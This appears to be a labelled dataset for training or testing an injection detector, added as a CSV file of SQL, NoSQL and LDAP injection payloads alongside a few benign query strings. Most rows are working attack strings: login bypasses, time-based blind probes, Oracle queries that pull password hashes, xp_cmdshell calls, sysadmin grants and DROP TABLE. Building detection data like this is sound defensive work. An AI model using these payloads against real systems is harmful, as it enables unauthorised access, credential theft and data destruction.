@@ -1,0 +1,412 @@
+payload,label
+""");waitfor delay '0:0:__TIME__'--",1
+)) or pg_sleep(__TIME__)--,1
+admin') or '1'='1'#,1
+')) or (('x'))=(('x,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",1
+root' or '1'='1'--,1
+or 3=3,1
+%20'sleep%2050',1
+"admin"") or (""1""=""1""--",1
+declare @s varchar(200) select @s = 0x77616974 ...,1
+root' or '1'='1,1
+%21,1
+'%20%26%26%20this.password.match(/.*/)//+%00,1
+limit,1
+db.injection.insert({success:1});,1
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
+1) or sleep(__TIME__)#,1
+' or 1=1 or ''=',1
+or 1/*,1
+uni/**/on sel/**/ect,1
+hi' or 'x'='x';,1
+""")) or pg_sleep(__TIME__)--",1
+'%20or%20''=',1
+or 'a'='a,1
+) union select * from information_schema.tables;,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",1
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,1
+UNION SELECT,1
+' or '1'='1'--,1
+');waitfor delay '0:0:__TIME__'--,1
+));waitfor delay '0:0:__TIME__'--,1
+',1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",1
+""") or (""x"")=(""x",1
+'; exec master..xp_cmdshell,1
+"root"") or (""1""=""1""--",1
+ or 3=3 --,1
+"admin"") or ""1""=""1""--",1
+"1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055",1
+or pg_sleep(__TIME__)--,1
+UNION ALL SELECT,1
+or sleep(__TIME__)#,1
+select * from information_schema.tables--,1
+') or ('a'='a,1
+[$ne]=1,1
+sleep(__TIME__)#,1
+"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
+password:*/=1--,1
+or 1 in (select @@version)--,1
+id=42&action=view,0
+"admin"") or ""1""=""1",1
+or 'something' = 'some'+'thing',1
++sqlvuln,1
+%20$(sleep%2050),1
+"1) or benchmark(10000000,MD5(1))#",1
+"""^""",1
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,1
+--sp_password,1
+%7C,1
+""" or 1=1",1
+"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
+group by userid having 1=1--,1
+%2A%28%7C%28mail%3D%2A%29%29,1
+"' exec sp_addsrvrolemember 'name' , 'sysadmin' --",1
+29 %,1
+' or 0=0 --,1
+' or ''=',1
+"root""/*",1
+' grant connect to name; grant resource to name; --,1
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,1
+t'exec master..xp_cmdshell 'nslookup www.googl ...,1
+’ or ‘1’=’1,1
+admin' or '1'='1,1
+""" or ""a""=""a",1
+"root"" or 1=1",1
+"admin"" or ""1""=""1""#",1
+or 'text' = n'text',1
+""" or """"&""",1
+root') or '1'='1,1
+\x27UNION SELECT,1
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
+@var select @var as var into temp end --,1
+"'exec sp_addlogin 'name' , 'password' --",1
+1'1,1
+1 and 1=1,1
+a' waitfor delay '0:0:10'--,1
+; exec master..xp_cmdshell,1
+or 'text' > 't',1
+"and 1=( if((load_file(char(110,46,101,120,11 ...",1
+' or user like '%,1
+(,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",1
+root') or '1'='1'/*,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",1
+"""-""",1
+"union select 1,load_file('/etc/passwd'),1,1,1;",1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",1
+""")) or ((""x""))=((""x",1
+or a = a,1
+or,1
+"root"") or (""1""=""1""/*",1
+%26,1
+"root"" #",1
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,1
+""" or 1=1--",1
+distinct,1
+replace,1
+1 or pg_sleep(__TIME__)--,1
+root' or 1=1,1
+;waitfor delay '0:0:__TIME__'--,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",1
+or 1=1 /*,1
+)%20or%20('x'='x,1
+' or ''*',1
+) or sleep(__TIME__)=',1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",1
+"1234 "" AND 1=0 UNION ALL SELECT ""root"", ""81dc9bdb52d04dc20036dbd8313ed055",1
+' (select top 1,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",1
+sqlvuln,1
+') or sleep(__TIME__)=',1
+"' union (select NULL, NULL, (select @@version)) --",1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",1
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
+*(|(objectclass=*)),1
+' or userid like '%,1
+||6,1
+root' or 1=1--,1
+' union (select @@version) --,1
+â or 1=1 --,1
+desc,1
+""") or benchmark(10000000,MD5(1))#",1
+"<>""'%;)(&+",1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",1
+"' || myappadmin.adduser('admin', 'newpass') || '",1
+""" or pg_sleep(__TIME__)--",1
+"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
+admin' or 1=1--,1
+root') or '1'='1'#,1
+"root"" or ""1""=""1",1
+';sleep(5000);,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",1
+declare @q nvarchar (4000) select @q =,1
+"""));waitfor delay '0:0:__TIME__'--",1
+(sqlattempt2),1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",1
+%20or%201=1,1
+root' or '1'='1'/*,1
+"' or benchmark(10000000,MD5(1))#",1
+%20or%20x=x,1
+truncate,1
+')%20or%20('x'='x,1
+28 %,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",1
+""" """,1
+""" or ""x""=""x",1
+or 1=1#,1
+%2A%7C,1
+<username>'--,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",1
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,1
+a' or 3=3--,1
+{$gt: ''},1
+"""hi"""") or (""""a""""=""""a""",1
+'%20or%20'x'='x,1
+root' or 1=1#,1
+search=laptop&category=electronics,0
+"admin"" or 1=1#",1
+3.10E+17,1
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,1
+""" or """"^""",1
+"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR""*/",1
+23 OR 1=1,1
+""" or true--",1
+) or (a=a,1
+(sqlvuln),1
+' UNION ALL SELECT,1
+GET /index.html HTTP/1.1,0
+""" or sleep(__TIME__)#",1
+"root"" or ""1""=""1""--",1
+"', $where: '1 == 1'",1
+q=python+tutorial&lang=en,0
+or a=a,1
+//*,1
+' or uname like '%,1
+"root"") or (""1""=""1""#",1
+as,1
+'create user name identified by pass123 temporary tablespace temp default tablespace users;,1
+""" or 1=1#",1
+' or username like '%,1
+"admin"") or (""1""=""1",1
+/,1
+"1 or benchmark(10000000,MD5(1))#",1
+admin' or '1'='1'#,1
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,1
+root') or '1'='1'--,1
+"root"" or 1=1#",1
+'&',1
+or 0=0 #,1
+declare @s varchar (200) select @s = 0x73656c6 ...,1
+admin' or '1'='1'--,1
+%C0%80%27%C0%80%C0%80%C0%80O%C0%82R%C0%80%C0%801%C0%80%C0%A11,1
+@variable,1
+1 or 1=1,1
+1)) or pg_sleep(__TIME__)--,1
+{ $ne: 1 },1
+Ã½ or 1=1 --,1
+')) or sleep(__TIME__)=',1
+26 %,1
+""" or """"*""",1
+(||6),1
+""";waitfor delay '0:0:__TIME__'--",1
+1 or sleep(__TIME__)#,1
+"admin"" or 1=1/*",1
+or '1'='1,1
+or 1=1--,1
+admin' or ',1
+admin') or ('1'='1'/*,1
+'OR '' = '	Allows authentication without a valid username.,1
+"""&""",1
+or%201=1,1
+PRINT @@variable,1
+' or 1=1#,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",1
+"') or benchmark(10000000,MD5(1))#",1
+"root"" or ""1""=""1""/*",1
+"root"") or (""1""=""1",1
+"{$nin: [""""]}}",1
+' or 1=1,1
+"admin""/*",1
+*(|(mail=*)),1
+//,1
+'OR 1=1--,1
+||UTL_HTTP.REQUEST,1
+x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
+"root"") or ""1""=""1""--",1
+"true, $where: '1 == 1'",1
+or a=a--,1
+admin') or '1'='1'/*,1
+""") or true--",1
+anything' OR 'x'='x,1
+a',1
+"root"") or ""1""=""1""#",1
+root') or ('1'='1'#,1
+) or pg_sleep(__TIME__)--,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",1
+admin') or ('1'='1'#,1
+exec xp,1
+' ; drop table temp --,1
+and 1 in (select var from temp)--,1
+root' or 1=1/*,1
+"admin""or 1=1 or """"=""",1
+"SLEEP(1) /*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",1
+; exec ('sel' + 'ect us' + 'er'),1
+select name from syscolumns where id = (sele ...,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",1
+$where: '1 == 1',1
+"' union (select NULL, NULL, NULL,  (select @@version)) --",1
+') or ('x')=('x,1
+or 1 --',1
+""") or pg_sleep(__TIME__)--",1
+or sleep(__TIME__)=',1
+sqlvuln;,1
+",@variable",1
+&apos;%20OR,1
+' or true--,1
+--,1
+handler,1
+root') or ('1'='1'/*,1
+or 'whatever' in ('whatever'),1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",1
+pg_sleep(__TIME__)--,1
+"or 0=0 #""",1
+(select top 1,1
+declare @s varchar(22) select @s =,1
+or 1=1 or ''=',1
+root' #,1
+*/*,1
+""" or """" """,1
+admin'or 1=1 or ''=',1
+%29,1
+page=1&limit=20&sort=date,0
+' or ''^',1
+"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",1
+"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",1
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,1
+""")) or sleep(__TIME__)=""",1
+root' --,1
+insert,1
+â or 3=3 --,1
+'));waitfor delay '0:0:__TIME__'--,1
+bfilename,1
+'^',1
+a' or 'a' = 'a,1
+"hi or 1=1 --""",1
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1
+0x77616974666F722064656C61792027303A303A313027 ...,1
+' or sleep(__TIME__)#,1
+root'or 1=1 or ''=',1
+", $where: '1 == 1'",1
+"admin"" or ""1""=""1",1
+' or 1=1/*,1
+admin' or 1=1#,1
+' UNION SELECT,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",1
+or 0=0 --,1
+"admin"" #",1
+username=john&password=hello123,0
+' || 'a'=='a,1
+'create user name identified by 'pass123' --,1
+admin') or '1'='1'--,1
+%20or%20''=',1
+# from wapiti,1
+root') or ('1'='1'--,1
+);waitfor delay '0:0:__TIME__'--,1
+')) or pg_sleep(__TIME__)--,1
+"')) or benchmark(10000000,MD5(1))#",1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",1
+union select,1
+ or 1=1 --,1
+1) or pg_sleep(__TIME__)--,1
+admin') or ('1'='1'--,1
+admin' #,1
+' or 1=1 --,1
+; or '1'='1',1
+"root"") or ""1""=""1",1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
+?,1
+exec(@s),1
+"admin"") or ""1""=""1""/*",1
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
+select,1
+"admin"" --",1
+0x770061006900740066006F0072002000640065006C00 ...,1
+') or true--,1
+1)) or sleep(__TIME__)#,1
+' or uid like '%,1
+"root"" or ""1""=""1""#",1
+root') or ('1'='1,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",1
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/,1
+t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
+"admin"" or ""1""=""1""/*",1
+"admin"" or ""1""=""1""--",1
+"admin"" or 1=1--",1
+*|,1
+or isNULL(1/0) /*,1
+21 %,1
+"""*""",1
+"' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",1
+or ''=',1
+"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",1
+!,1
+'%20or%201=1,1
+char%4039%41%2b%40SELECT,1
+# you will need to customize/modify some of the vaules in the queries for best effect,1
+%2A%28%7C%28objectclass%3D%2A%29%29,1
+'||UTL_HTTP.REQUEST,1
+admin' --,1
+|,1
+root'/*,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",1
+admin') or ('1'='1,1
+0 or 1=1,1
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,1
+'*',1
+tz_offset,1
+"' } ], $comment:'successful MongoDB injection'",1
+x' AND email IS NULL; --,1
+0x730065006c0065006300740020004000400076006500 ...,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",1
+""" or 0=0 --",1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",1
+x' AND members.email IS NULL; --,1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",1
+"1)) or benchmark(10000000,MD5(1))#",1
+' or '1'='1,1
+' or sleep(__TIME__)=',1
+"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",1
+' && this.password.match(/.*/)//+%00,1
+order by,1
+' or 'x'='x,1
+' && this.passwordzz.match(/.*/)//+%00,1
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,1
+# <user-fieldname> <pass-fieldname> <username>,1
+admin' or '1'='1'/*,1
+"root"" or 1=1/*",1
+%20or%20'x'='x,1
+"admin"") or (""1""=""1""#",1
+"' union (select NULL, (select @@version)) --",1
+or 1=1/*,1
+x' or 1=1 or 'x'='y,1
+' or a=a--,1
+or username like char(37);,1
+""" or """"-""",1
+or 'unusual' = 'unusual',1
+"or benchmark(10000000,MD5(1))#",1
+"admin"") or ""1""=""1""#",1
+'-',1
+to_timestamp_tz,1
+or 2 between 1 and 3,1
+having 1=1--,1
+"', $or: [ {}, { 'a':'a",1
+"""a"""" or 1=1--""",1
+hi' or 'a'='a,1
+"admin"") or (""1""=""1""/*",1
+1 waitfor delay '0:0:10'--,1
+' or (EXISTS),1
+"1;(load_file(char(47,101,116,99,47,112,97,115, ...",1
+like,1
